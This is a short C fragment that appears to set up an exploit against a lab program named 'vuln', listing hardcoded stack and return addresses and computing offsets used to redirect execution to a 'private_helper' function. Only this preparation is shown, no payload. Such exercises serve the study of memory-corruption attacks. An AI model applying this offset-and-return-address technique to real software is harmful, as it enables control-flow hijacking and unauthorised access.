#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

const char *nargv[3] = { "vuln", STRINGIFY(GRP), NULL };

const uint64_t auth_bp          =   0x7ffca4e76e10; // rbp value in auth
const uint64_t auth_cred_loc    =   0x7ffca4e76e00; // loc of cred 
const uint64_t auth_db_loc      =   0x7ffca4e76df8; // loc of db (local var of auth)
const uint64_t g_bp             =   0x7ffca4e76e60; // rbp value in g
const uint64_t auth_cred        =   0x7ffca4e76d10; // value of cred (after alloca)
const uint64_t main_bp          =   0x7ffca4e77550; // saved rbp value in mainloop
uint64_t main_loop_return_addr  =   0x5613287a3ea9; // return address on the stack inside main loop
uint64_t private_helper_addr    =   0x5613287a3f3a;

const uint64_t auth_bp_cred_loc_dist    = auth_cred_loc - auth_bp;
const uint64_t auth_db_cred_dist        = auth_db_loc - auth_cred;
const uint64_t auth_bp_cred_dist        = auth_cred - auth_bp;
const uint64_t auth_main_bp_dist        = auth_bp - main_bp;
const uint64_t g_main_bp_dist		    = main_bp - g_bp;
const uint64_t g_bp_cred_dist		    = g_bp - auth_cred;
const uint64_t private_helper_distance  = private_helper_addr - main_loop_return_addr;
